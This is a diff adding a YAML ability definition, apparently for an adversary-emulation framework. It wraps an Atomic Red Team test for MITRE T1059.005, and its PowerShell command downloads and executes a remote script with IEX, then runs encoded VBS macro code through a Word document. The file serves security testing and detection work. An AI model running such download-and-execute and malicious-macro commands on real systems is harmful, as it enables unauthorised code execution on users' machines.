@@ -1,0 +1,32 @@
+---
+- id: 9c955a373154a7090d4b4396b561f5da
+  name: Encoded VBS code execution
+  description: 'This module takes an encoded VBS script and executes it from within
+    a malicious document. By default, upon successful execution
+
+    a message box will pop up displaying "ART T1059.005"
+
+
+    A note regarding this module, due to the way that this module utilizes "ScriptControl"
+    a 64bit version of Microsoft Office is required.
+
+    You can validate this by opening WinWord -> File -> Account -> About Word
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1059.005
+    name: 'Command and Scripting Interpreter: Visual Basic'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt"
+          -officeProduct "Word" -sub "Exec"'
+        payloads: []
+        cleanup: Get-WmiObject win32_process | Where-Object {$_.CommandLine -like
+          "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
